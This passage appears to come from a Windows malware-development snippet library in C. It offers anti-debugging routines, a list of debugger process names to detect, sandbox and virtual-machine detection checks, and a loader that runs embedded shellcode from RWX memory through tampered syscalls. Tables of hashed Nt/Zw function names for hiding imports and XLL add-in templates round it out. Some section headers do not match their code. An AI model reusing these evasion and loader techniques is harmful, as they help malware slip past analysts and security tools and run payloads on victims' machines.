	if ((STATUS = pNtSetInformationVirtualMemory(hProcess, VmCfgCallTargetInformation, 0x01, &MemRangeEntry, &VmInformation, sizeof(VmInformation))) != 0x00) {
		printf("[!] NtSetInformationVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
```
### XLL xlAutoClose Template
```c
#include <Windows.h>
#include <stdio.h>

__declspec(dllexport) int __stdcall xlAutoClose() {

	if (!MessageBox(NULL, L"Hello World!", L"Hello", MB_OK)) {
		printf("[!] MessageBox Failed With Error: %d\n", GetLastError());
		return -1;
	}

	return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {

	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```
### XLL xlAutoOpen Template
```c
#include <Windows.h>
#include <stdio.h>
```
### IAT Camouflage 
```c
#include <Windows.h>
#include <stdio.h>

__declspec(dllexport) int __stdcall xlAutoOpen() {

	if (!MessageBox(NULL, L"Hello World!", L"Hello", MB_OK)) {
		printf("[!] MessageBox Failed With Error: %d\n", GetLastError());
		return -1;
	}

	return 0;
}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {

	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```
### XLL xlAutoAdd Template
```c
#include <Windows.h>
#include <stdio.h>

__declspec(dllexport) int __stdcall xlAutoAdd() {

		if (!MessageBox(NULL, L"Hello World!", L"Hello", MB_OK)) {
		printf("[!] MessageBox Failed With Error: %d\n", GetLastError());
		return -1;
	}

	return 0;
}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {

	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```

### Domain Join Check
```c
#include <windows.h>
#include <stdio.h>
#include <lm.h>
#pragma comment(lib, "netapi32.lib")

BOOL IsDomainJoined() {

	LPWSTR					szNameBuffer	= NULL;
	NET_API_STATUS			NetStatus		= 0x00;
	NETSETUP_JOIN_STATUS	BufferType		= { 0 };

	if ((NetStatus = NetGetJoinInformation(NULL, &szNameBuffer, &BufferType)) != 0x00)
		printf("[!] NetGetJoinInformation Failed With Error: 0x%0.8X \n", NetStatus);

	if (szNameBuffer != NULL)
		NetApiBufferFree(szNameBuffer);

	return ((NetStatus == 0x00) && (BufferType == NetSetupDomainName)) ? TRUE : FALSE;
}
```
### Anti-Debugging Via NtSystemDebugControl
```c
#include <windows.h>
#include <stdio.h>
typedef enum _SYSDBG_COMMAND
{
    SysDbgQueryModuleInformation,
    SysDbgQueryTraceInformation,
    SysDbgSetTracepoint,
    SysDbgSetSpecialCall, // PVOID
    SysDbgClearSpecialCalls, // void
    SysDbgQuerySpecialCalls,
    SysDbgBreakPoint,
    SysDbgQueryVersion, // DBGKD_GET_VERSION64
    SysDbgReadVirtual, // SYSDBG_VIRTUAL
    SysDbgWriteVirtual, // SYSDBG_VIRTUAL
    SysDbgReadPhysical, // SYSDBG_PHYSICAL // 10
    SysDbgWritePhysical, // SYSDBG_PHYSICAL
    SysDbgReadControlSpace, // SYSDBG_CONTROL_SPACE
    SysDbgWriteControlSpace, // SYSDBG_CONTROL_SPACE
    SysDbgReadIoSpace, // SYSDBG_IO_SPACE
    SysDbgWriteIoSpace, // SYSDBG_IO_SPACE
    SysDbgReadMsr, // SYSDBG_MSR
    SysDbgWriteMsr, // SYSDBG_MSR
    SysDbgReadBusData, // SYSDBG_BUS_DATA
    SysDbgWriteBusData, // SYSDBG_BUS_DATA
    SysDbgCheckLowMemory, // 20
    SysDbgEnableKernelDebugger,
    SysDbgDisableKernelDebugger,
    SysDbgGetAutoKdEnable,
    SysDbgSetAutoKdEnable,
    SysDbgGetPrintBufferSize,
    SysDbgSetPrintBufferSize,
    SysDbgGetKdUmExceptionEnable,
    SysDbgSetKdUmExceptionEnable,
    SysDbgGetTriageDump, // SYSDBG_TRIAGE_DUMP
    SysDbgGetKdBlockEnable, // 30
    SysDbgSetKdBlockEnable,
    SysDbgRegisterForUmBreakInfo,
    SysDbgGetUmBreakPid,
    SysDbgClearUmBreakPid,
    SysDbgGetUmAttachPid,
    SysDbgClearUmAttachPid,
    SysDbgGetLiveKernelDump, // SYSDBG_LIVEDUMP_CONTROL
    SysDbgKdPullRemoteFile, // SYSDBG_KD_PULL_REMOTE_FILE
    SysDbgMaxInfoClass
} SYSDBG_COMMAND, * PSYSDBG_COMMAND;

typedef NTSTATUS(NTAPI* fnNtSystemDebugControl)(SYSDBG_COMMAND Command, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength, PULONG ReturnLength);

BOOL AntiDbgNtSystemDebugControl() {

    NTSTATUS                    STATUS                      = 0x00;
    fnNtSystemDebugControl      pNtSystemDebugControl       = NULL;

    if (!(pNtSystemDebugControl = (fnNtSystemDebugControl)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtSystemDebugControl"))) {
        printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    // STATUS_DEBUGGER_INACTIVE: 0xC0000354 - An attempt to do an operation on a debug port failed because the port is in the process of being deleted.
    if ((STATUS = pNtSystemDebugControl(SysDbgBreakPoint, NULL, NULL, NULL, NULL, NULL)) == 0xC0000354)
        return FALSE;

    return TRUE;
}
```
### Anti-Debugging Via ProcessDebugFlags
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

BOOL AntiDbgNtProcessDebugFlags() {

    NTSTATUS                      STATUS                        = 0x00;
    fnNtQueryInformationProcess   pNtQueryInformationProcess    = NULL;
    DWORD64                       dwProcessDebugObjectHandle    = 0x00;
    ULONG                         uInherit                      = 0x00;

    if (!(pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtQueryInformationProcess"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationProcess((HANDLE)-1, ProcessDebugFlags, &uInherit, sizeof(ULONG), NULL)) == 0x00 && !uInherit)
        return TRUE;

    return FALSE;
}
```
### Anti-Debugging Via NTGlobalFlag
```c
#include <windows.h>
#include <stdio.h>
#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40

BOOL IsDebuggerPresent3() {

  // getting the PEB structure
#ifdef _WIN64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

  // checking the 'NtGlobalFlag' element
  if (pPeb->NtGlobalFlag == (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS))
    return TRUE;

  return FALSE;
}
```
### Enumerate Blacklisted Processes
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

BOOL GetProcessIDViaNtQueryFunc(IN LPWSTR szProcessNameArray[], IN DWORD dwNmbrOfArrayElements) {

	NTSTATUS						STATUS							= 0x00;
	fnNtQuerySystemInformation		pNtQuerySystemInformation		= NULL;
	ULONG							uArrayLength					= 0x00;
	PSYSTEM_PROCESS_INFORMATION		pSystemProcInfo					= NULL;
	PBYTE							pTmpPntrVar						= NULL;

	if (!szProcessNameArray || !dwNmbrOfArrayElements)
		return FALSE;

	if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQuerySystemInformation"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uArrayLength)) != STATUS_SUCCESS && STATUS != STATUS_INFO_LENGTH_MISMATCH) {
		printf("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!(pTmpPntrVar = pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uArrayLength))) {
		printf("[!] HeapAlloc Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = pNtQuerySystemInformation(SystemProcessInformation, pSystemProcInfo, uArrayLength, NULL)))) {
		printf("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}


    for (int x = 0; x < dwNmbrOfArrayElements; x++) {

        WCHAR   wcUpperCaseProcName [MAX_PATH]   = { 0x00 };

        if (lstrlenW(szProcessNameArray[x]) > MAX_PATH)
            continue;

        for (int i = 0; i < lstrlenW(szProcessNameArray[x]); i++) {
            if (szProcessNameArray[x][i] >= 'a' && szProcessNameArray[x][i] <= 'z')
                wcUpperCaseProcName[i] = szProcessNameArray[x][i] - 'a' + 'A';
            else
                wcUpperCaseProcName[i] = szProcessNameArray[x][i];
        }

	    while (pSystemProcInfo->NextEntryOffset) {

		    WCHAR	szUprProcName[MAX_PATH]     = { 0x00 };

		    if (!pSystemProcInfo->ImageName.Length || pSystemProcInfo->ImageName.Length >= MAX_PATH)
			    goto _NEXT_ELEMENT;

		    for (int i = 0; i < pSystemProcInfo->ImageName.Length; i++) {
			    if (pSystemProcInfo->ImageName.Buffer[i] >= 'a' && pSystemProcInfo->ImageName.Buffer[i] <= 'z')
				    szUprProcName[i] = pSystemProcInfo->ImageName.Buffer[i] - 'a' + 'A';
			    else
				    szUprProcName[i] = pSystemProcInfo->ImageName.Buffer[i];
		    }

		    if (wcscmp(wcUpperCaseProcName, szUprProcName) == 0x00) {
                return TRUE;
		    }

	    _NEXT_ELEMENT:
		    pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcInfo + pSystemProcInfo->NextEntryOffset);
	    }

        // Set the pointer back to the start of the array
        pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)pTmpPntrVar;
    }


_END_OF_FUNC:
	if (pTmpPntrVar)
		HeapFree(GetProcessHeap(), 0x00, pTmpPntrVar);
	return FALSE;
}

/*
// Example:

#define BLACKLISTARRAY_SIZE 5          // Number of elements inside the array

WCHAR* g_BlackListedDebuggers[BLACKLISTARRAY_SIZE] = {
        L"x64dbg.exe",                 // xdbg debugger
        L"ida.exe",                    // IDA disassembler
        L"ida64.exe",                  // IDA disassembler
        L"VsDebugConsole.exe",         // Visual Studio debugger
        L"msvsmon.exe"                 // Visual Studio debugger
};
*/
```
### Detect Virtualization Through Monitor Resolution
```c
#include <windows.h>
#include <stdio.h>
BOOL CALLBACK ResolutionCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM ldata) {

    MONITORINFO     MonitorInfo     = { 0 };
    INT             X               = 0x00,
                    Y               = 0x00;

    MonitorInfo.cbSize = sizeof(MONITORINFO);

    if (!GetMonitorInfoW(hMonitor, &MonitorInfo)) {
        printf("[!] GetMonitorInfoW Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    // Calculating the X coordinates of the desplay
    X = MonitorInfo.rcMonitor.right - MonitorInfo.rcMonitor.left;
    // Calculating the Y coordinates of the desplay
    Y = MonitorInfo.rcMonitor.top - MonitorInfo.rcMonitor.bottom;

    // If numbers are in negative value, reverse them
    if (X < 0)
        X = -X;
    if (Y < 0)
        Y = -Y;

    if (X < 1080 || Y < 900)
        *((BOOL*)ldata) = TRUE;

    return TRUE;
}

BOOL IsVirtualEnvResolutionCheck() {

    BOOL bResult = FALSE;

    if (!EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)ResolutionCallback, &bResult)) {
        printf("[!] EnumDisplayMonitors Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    return bResult;
}
```
### Detect Virtualization Through Hardware Specification
```c
#include <windows.h>
#include <stdio.h>
BOOL IsVirtualEnvHardwareCheck() {

    SYSTEM_INFO		SystemInfo      = { 0 };
    MEMORYSTATUSEX	MemoryStatus    = { .dwLength = sizeof(MEMORYSTATUSEX) };
    HKEY			hKey            = NULL;
    DWORD			dwUsbNumber     = 0x00,
                    dwRegErr        = 0x00;

    // Less than 2 processors
    GetSystemInfo(&SystemInfo);
    if (SystemInfo.dwNumberOfProcessors < 2)
        return TRUE;

    if (!GlobalMemoryStatusEx(&MemoryStatus)) {
        printf("[!] GlobalMemoryStatusEx Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    // Less than 4 gb of ram
    if ((DWORD)MemoryStatus.ullTotalPhys < (DWORD)(4 * 1073741824))
        return TRUE;

    if ((dwRegErr = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", NULL, KEY_READ, &hKey)) != ERROR_SUCCESS) {
        printf("[!] RegOpenKeyExA Failed With Error: %d \n", dwRegErr);
        return FALSE;
    }

    if ((dwRegErr = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &dwUsbNumber, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
        printf("[!] RegQueryInfoKeyA Failed With Error: %d \n", dwRegErr);
        return FALSE;
    }

    // Less than 2 usbs previously mounted
    if (dwUsbNumber < 2)
        return TRUE;

    if ((dwRegErr = RegCloseKey(hKey)) != ERROR_SUCCESS) {
        printf("[!] RegCloseKey Failed With Error: %d \n", dwRegErr);
        return FALSE;
    }

    return FALSE;
}
```
### Syscalls Tampering
```c
#include <windows.h>
#include <stdio.h>
#include "SyscallTampering.h"

// ==========================================================================================================================

#define ZwAllocateVirtualMemory_CRCA     0x71D7EF35
#define ZwProtectVirtualMemory_CRCA      0x998153D9
#define ZwCreateThreadEx_CRCA			 0x477AC175

// ==========================================================================================================================

unsigned char rawData[] = {
		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
		0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
		0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
		0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

// ==========================================================================================================================


int main() {

	if (!InitHardwareBreakpointHooking())
		return -1;

	PVOID		BaseAddress			= NULL;
	SIZE_T		RegionSize			= 0x100;
	DWORD		dwOldProtection		= 0x00;
	HANDLE		hThread				= NULL;

	TAMPER_SYSCALL(ZwAllocateVirtualMemory_CRCA, (HANDLE)-1, &BaseAddress, 0x00, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, NULL, NULL, NULL, NULL);

#ifdef DEBUG
	printf("\n[i] BaseAddress : 0x%p \n", BaseAddress);
	printf("[i] RegionSize : %d \n\n", (int)RegionSize);
#endif

	TAMPER_SYSCALL(ZwProtectVirtualMemory_CRCA, (HANDLE)-1, &BaseAddress, &RegionSize, PAGE_EXECUTE_READWRITE, &dwOldProtection, NULL, NULL, NULL, NULL, NULL, NULL);

#ifdef DEBUG
	printf("\n[i] Memory is now RWX \n\n");
#endif

	memcpy(BaseAddress, rawData, sizeof(rawData));

	TAMPER_SYSCALL(ZwCreateThreadEx_CRCA, &hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

#ifdef DEBUG
	printf("\n[*] Payload Executed With Thread Of ID: %d \n", GetThreadId(hThread));
#endif

	Sleep(1000 * 10);

	if (!HaltHardwareBreakpointHooking())
		return -1;

	return 0;
}
```
### ROTR Syscalls Hash Value (Nt)
```c
#define NtAllocateVirtualMemory_ROTR     0x014044AE
#define NtFreeVirtualMemory_ROTR         0xE584BAAE
#define NtProtectVirtualMemory_ROTR      0xE67C7320
#define NtCreateSection_ROTR     0xAC2EDA02
#define NtOpenSection_ROTR       0xD443EC8C
#define NtMapViewOfSection_ROTR  0x92DD00B3
#define NtUnmapViewOfSection_ROTR        0x12D71086
#define NtCreateFile_ROTR        0x4489294C
#define NtOpenFile_ROTR  0x95CE2BEE
#define NtReadFile_ROTR  0x130FAB4E
#define NtWriteFile_ROTR         0xAC1F8EAD
#define NtClose_ROTR     0x7B3F64A4
#define NtWaitForSingleObject_ROTR       0xC6F6AFCD
#define NtDelayExecution_ROTR    0x078A465C
#define NtReadVirtualMemory_ROTR         0xDF10BA8D
#define NtWriteVirtualMemory_ROTR        0x1130814D
#define NtFlushInstructionCache_ROTR     0x8E72CB3E
#define NtQuerySystemInformation_ROTR    0xEFFC1CF8
#define NtQueryInformationProcess_ROTR   0xE6AAB603
#define NtQueryVirtualMemory_ROTR        0x8F3377CC
#define NtQueueApcThread_ROTR    0x5ABF32F8
#define NtOpenProcess_ROTR       0x7B736553
#define NtOpenThread_ROTR        0x31BA878F
#define NtCreateProcess_ROTR     0x535E52C9
#define NtCreateProcessEx_ROTR   0xD5254DF1
#define NtCreateUserProcess_ROTR         0x0C43BACB
#define NtCreateThread_ROTR      0x2731427B
#define NtCreateThreadEx_ROTR    0x93EC9D3D
#define NtSuspendThread_ROTR     0xAC7C3B64
#define NtResumeThread_ROTR      0xF3A5D696
#define NtGetContextThread_ROTR  0x8044D772
#define NtSetContextThread_ROTR  0x8644D772
#define NtTerminateThread_ROTR   0x3ECF2582
#define NtTerminateProcess_ROTR  0x618D8E8F
```
### Jenkins One-at-a-Time Syscalls Hash Values (Nt)
```c
#define NtAllocateVirtualMemory_JENK     0xE33A06BF
#define NtFreeVirtualMemory_JENK         0xACA41699
#define NtProtectVirtualMemory_JENK      0x82BB0EE0
#define NtCreateSection_JENK     0x9A538B2B
#define NtOpenSection_JENK       0x6EC52BCD
#define NtMapViewOfSection_JENK  0xD3B060A1
#define NtUnmapViewOfSection_JENK        0x0A6A385C
#define NtCreateFile_JENK        0xF6AB8555
#define NtOpenFile_JENK  0x78ECA9D9
#define NtReadFile_JENK  0x4F8C7D7C
#define NtWriteFile_JENK         0x3EE0C394
#define NtClose_JENK     0xB1D7C572
#define NtWaitForSingleObject_JENK       0xE2C26E26
#define NtDelayExecution_JENK    0xC4714BC3
#define NtReadVirtualMemory_JENK         0x026DA588
#define NtWriteVirtualMemory_JENK        0x7A65C193
#define NtFlushInstructionCache_JENK     0x14E66623
#define NtQuerySystemInformation_JENK    0x62A8E2DE
#define NtQueryInformationProcess_JENK   0xE873107E
#define NtQueryVirtualMemory_JENK        0xF1CC2EBC
#define NtQueueApcThread_JENK    0xCD2A07EC
#define NtOpenProcess_JENK       0x61CF38BC
#define NtOpenThread_JENK        0x079D638A
#define NtCreateProcess_JENK     0xDC6EF4F6
#define NtCreateProcessEx_JENK   0xF4AE0B6F
#define NtCreateUserProcess_JENK         0x012E3FF8
#define NtCreateThread_JENK      0x7F7AE35F
#define NtCreateThreadEx_JENK    0xE5F15DAA
#define NtSuspendThread_JENK     0xFCD792CE
#define NtResumeThread_JENK      0x918A52F1
#define NtGetContextThread_JENK  0xF864F3BD
#define NtSetContextThread_JENK  0xAFB6E057
#define NtTerminateThread_JENK   0xC9AA0016
#define NtTerminateProcess_JENK  0x9C12CA95
```
### ROTR Syscalls Hash Values (Zw)
```c
#define ZwAllocateVirtualMemory_ROTR     0x0140A7AE
#define ZwFreeVirtualMemory_ROTR         0xE584C0DE
#define ZwProtectVirtualMemory_ROTR      0xE6ADF320
#define ZwCreateSection_ROTR     0xAC2EDA65
#define ZwOpenSection_ROTR       0xD45CAC8C
#define ZwMapViewOfSection_ROTR  0x92E018B3
#define ZwUnmapViewOfSection_ROTR        0x72D71092
#define ZwCreateFile_ROTR        0x50E9294C
#define ZwOpenFile_ROTR  0x95CE2F06
#define ZwReadFile_ROTR  0x130FAE66
#define ZwWriteFile_ROTR         0xDC1F8EB3
#define ZwClose_ROTR     0xDE3F64A4
#define ZwWaitForSingleObject_ROTR       0xDFB6AFCD
#define ZwDelayExecution_ROTR    0xCD8A465C
#define ZwReadVirtualMemory_ROTR         0xDF10C0BD
#define ZwWriteVirtualMemory_ROTR        0x71308159
#define ZwFlushInstructionCache_ROTR     0x8E732E3E
#define ZwQuerySystemInformation_ROTR    0xEFFC1DBE
#define ZwQueryInformationProcess_ROTR   0x72AAB605
#define ZwQueryVirtualMemory_ROTR        0xEF3377D8
#define ZwQueueApcThread_ROTR    0x20BF32F9
#define ZwOpenProcess_ROTR       0x7B8C2553
#define ZwOpenThread_ROTR        0x3E1A878F
#define ZwCreateProcess_ROTR     0x535E532C
#define ZwCreateProcessEx_ROTR   0xD6B14DF1
#define ZwCreateUserProcess_ROTR         0x0C43C0FB
#define ZwCreateThread_ROTR      0x273173FB
#define ZwCreateThreadEx_ROTR    0x59EC9D3E
#define ZwSuspendThread_ROTR     0xAC7C3BC7
#define ZwResumeThread_ROTR      0xF3A60816
#define ZwGetContextThread_ROTR  0x8047EF72
#define ZwSetContextThread_ROTR  0x8647EF72
#define ZwTerminateThread_ROTR   0x405B2582
#define ZwTerminateProcess_ROTR  0x6190A68F
```
### Lose-Lose Syscalls Hash Values (Zw)
```c
#define ZwAllocateVirtualMemory_LOSE     0x00000956
#define ZwFreeVirtualMemory_LOSE         0x000007B3
#define ZwProtectVirtualMemory_LOSE      0x00000912
#define ZwCreateSection_LOSE     0x000005FA
#define ZwOpenSection_LOSE       0x00000538
#define ZwMapViewOfSection_LOSE  0x00000714
#define ZwUnmapViewOfSection_LOSE        0x000007F7
#define ZwCreateFile_LOSE        0x000004A5
#define ZwOpenFile_LOSE  0x000003E3
#define ZwReadFile_LOSE  0x000003CD
#define ZwWriteFile_LOSE         0x0000045C
#define ZwClose_LOSE     0x000002C7
#define ZwWaitForSingleObject_LOSE       0x00000846
#define ZwDelayExecution_LOSE    0x00000674
#define ZwReadVirtualMemory_LOSE         0x000007AD
#define ZwWriteVirtualMemory_LOSE        0x0000083C
#define ZwFlushInstructionCache_LOSE     0x00000949
#define ZwQuerySystemInformation_LOSE    0x000009F2
#define ZwQueryInformationProcess_LOSE   0x00000A4C
#define ZwQueryVirtualMemory_LOSE        0x00000847
#define ZwQueueApcThread_LOSE    0x00000642
#define ZwOpenProcess_LOSE       0x00000542
#define ZwOpenThread_LOSE        0x000004BB
#define ZwCreateProcess_LOSE     0x00000604
#define ZwCreateProcessEx_LOSE   0x000006C1
#define ZwCreateUserProcess_LOSE         0x000007A3
#define ZwCreateThread_LOSE      0x0000057D
#define ZwCreateThreadEx_LOSE    0x0000063A
#define ZwSuspendThread_LOSE     0x0000060B
#define ZwResumeThread_LOSE      0x0000059A
#define ZwGetContextThread_LOSE  0x0000072E
#define ZwSetContextThread_LOSE  0x0000073A
#define ZwTerminateThread_LOSE   0x000006D2
#define ZwTerminateProcess_LOSE  0x00000759
```
### Cyclic Redundancy Check (CRC) Syscalls Hash Values (Nt)
```c
#define NtAllocateVirtualMemory_CRC      0x498165AA
#define NtFreeVirtualMemory_CRC  0xC7759246
#define NtProtectVirtualMemory_CRC       0x17C9087B
#define NtCreateSection_CRC      0xF85C77EC
#define NtOpenSection_CRC        0x7C850E30
#define NtMapViewOfSection_CRC   0xB347A7C1
#define NtUnmapViewOfSection_CRC         0x830A04FC
#define NtCreateFile_CRC         0x9010089D
#define NtOpenFile_CRC   0x0D719E50
#define NtReadFile_CRC   0x0E085374
#define NtWriteFile_CRC  0x1D5565B3
#define NtClose_CRC      0x0EDFC5CB
#define NtWaitForSingleObject_CRC        0x3D93EDA4
#define NtDelayExecution_CRC     0xB1CAFD37
#define NtReadVirtualMemory_CRC  0xAF816E0A
#define NtWriteVirtualMemory_CRC         0xF7C5A233
#define NtFlushInstructionCache_CRC      0x2C4865DD
#define NtQuerySystemInformation_CRC     0x968FA5D4
#define NtQueryInformationProcess_CRC    0xDAAF336D
#define NtQueryVirtualMemory_CRC         0x10B4C886
#define NtQueueApcThread_CRC     0x67399CDF
#define NtOpenProcess_CRC        0xD7EB6C49
#define NtOpenThread_CRC         0x1954A9B2
#define NtCreateProcess_CRC      0x53321595
#define NtCreateProcessEx_CRC    0xF3E29937
#define NtCreateUserProcess_CRC  0x2B09FF3F
#define NtCreateThread_CRC       0x7E6CABA1
#define NtCreateThreadEx_CRC     0x6411D915
#define NtSuspendThread_CRC      0xD7288A6E
#define NtResumeThread_CRC       0xD67413A8
#define NtGetContextThread_CRC   0xC402D0FC
#define NtSetContextThread_CRC   0xF614A2E5
#define NtTerminateThread_CRC    0x81467444
#define NtTerminateProcess_CRC   0x83AD29BD
```
### Djb2 Syscalls Hash Values (Nt)
```c
#define NtAllocateVirtualMemory_DJB2     0x6793C34C
#define NtFreeVirtualMemory_DJB2         0x471AA7E9
#define NtProtectVirtualMemory_DJB2      0x082962C8
#define NtCreateSection_DJB2     0xD02E20D0
#define NtOpenSection_DJB2       0x17CFA34E
#define NtMapViewOfSection_DJB2  0x231F196A
#define NtUnmapViewOfSection_DJB2        0x595014AD
#define NtCreateFile_DJB2        0x15A5ECDB
#define NtOpenFile_DJB2  0xC29C5019
#define NtReadFile_DJB2  0x2E979AE3
#define NtWriteFile_DJB2         0xD69326B2
#define NtClose_DJB2     0x8B8E133D
#define NtWaitForSingleObject_DJB2       0x4C6DC63C
#define NtDelayExecution_DJB2    0x0A49084A
#define NtReadVirtualMemory_DJB2         0xC24062E3
#define NtWriteVirtualMemory_DJB2        0x95F3A792
#define NtFlushInstructionCache_DJB2     0x80183ADF
#define NtQuerySystemInformation_DJB2    0xEE4F73A8
#define NtQueryInformationProcess_DJB2   0xD034FC62
#define NtQueryVirtualMemory_DJB2        0xE39D8E5D
#define NtQueueApcThread_DJB2    0xD4612238
#define NtOpenProcess_DJB2       0x5003C058
#define NtOpenThread_DJB2        0xFB8A31D1
#define NtCreateProcess_DJB2     0x08623DDA
#define NtCreateProcessEx_DJB2   0xA9E925B7
#define NtCreateUserProcess_DJB2         0x5F8E4559
#define NtCreateThread_DJB2      0x376E0713
#define NtCreateThreadEx_DJB2    0xCB0C2130
#define NtSuspendThread_DJB2     0x50FEBD61
#define NtResumeThread_DJB2      0x2C7B3D30
#define NtGetContextThread_DJB2  0x9E0E1A44
#define NtSetContextThread_DJB2  0x308BE0D0
#define NtTerminateThread_DJB2   0xAC3C9DC8
#define NtTerminateProcess_DJB2  0x1703AB2F
```
### Generic String Hashing Syscalls Hash Values (Nt)
```c
#define NtAllocateVirtualMemory_GEN      0x013D9089
#define NtFreeVirtualMemory_GEN  0x09C016E9
#define NtProtectVirtualMemory_GEN       0x5A5E5E39
#define NtCreateSection_GEN      0x0CCE907E
#define NtOpenSection_GEN        0x6CD3CBCE
#define NtMapViewOfSection_GEN   0x0F10234E
#define NtUnmapViewOfSection_GEN         0x0C7CC81E
#define NtCreateFile_GEN         0x02019965
#define NtOpenFile_GEN   0x66C798B5
#define NtReadFile_GEN   0x04826755
#define NtWriteFile_GEN  0x0F035F45
#define NtClose_GEN      0x058A36C5
#define NtWaitForSingleObject_GEN        0x24459274
#define NtDelayExecution_GEN     0x477E23EE
#define NtReadVirtualMemory_GEN  0x09AB45A9
#define NtWriteVirtualMemory_GEN         0x78D58219
#define NtFlushInstructionCache_GEN      0x718B5B65
#define NtQuerySystemInformation_GEN     0x0F64945E
#define NtQueryInformationProcess_GEN    0x0C7C03A3
#define NtQueryVirtualMemory_GEN         0x4748AE29
#define NtQueueApcThread_GEN     0x0C9EBA64
#define NtOpenProcess_GEN        0x62DCFF33
#define NtOpenThread_GEN         0x3906E2B4
#define NtCreateProcess_GEN      0x0301BC83
#define NtCreateProcessEx_GEN    0x01BC84C8
#define NtCreateUserProcess_GEN  0x57B37403
#define NtCreateThread_GEN       0x02F8C974
#define NtCreateThreadEx_GEN     0x07368538
#define NtSuspendThread_GEN      0x23654BA4
#define NtResumeThread_GEN       0x6C2324E4
#define NtGetContextThread_GEN   0x044DFB04
#define NtSetContextThread_GEN   0x044CBB04
#define NtTerminateThread_GEN    0x033B5914
#define NtTerminateProcess_GEN   0x0EB8BA93
```
### Djb2 Syscalls Hash Values (Zw)
```c
#define ZwAllocateVirtualMemory_DJB2     0x221C143B
